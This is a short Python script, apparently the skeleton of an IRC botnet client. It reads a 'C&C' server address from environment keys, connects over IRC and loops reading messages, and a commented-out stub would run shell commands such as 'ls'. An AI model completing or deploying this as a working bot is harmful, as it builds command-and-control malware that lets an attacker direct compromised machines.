from irc_class import IRC
from Env import Env

env = Env()

# C&C IP address
server = str(env.get(key="cncIp"))
port = int(env.get(key="cncPort"))

irc = IRC()

try:
    irc.connect(server, port)
except:
    print("Could not connected")


try:
    while True:
        text = irc.get_response()
except KeyboardInterrupt:
    print("Press Ctrl-C to terminate while statement")
    irc.close()


# from shell import shell
#
# shell("ls")

